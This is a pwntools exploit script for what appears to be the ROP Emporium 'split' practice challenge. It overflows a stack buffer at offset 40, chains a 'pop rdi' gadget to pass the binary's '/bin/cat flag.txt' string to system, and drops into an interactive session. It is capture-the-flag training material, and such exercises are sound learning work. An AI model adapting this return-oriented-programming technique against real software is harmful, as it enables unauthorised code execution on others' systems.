from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b *pwnme+89
continue
""".format(**locals())

exe = "./split"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 40

pop_rdi = ROP(exe).find_gadget(["pop rdi", "ret"])[0]

payload = flat(
    {
        offset: [
            pop_rdi + 1,
            pop_rdi,
            next(elf.search(b"/bin/cat flag.txt")),
            elf.sym["system"],
        ]
    }
)

io.sendline(payload)

io.interactive()
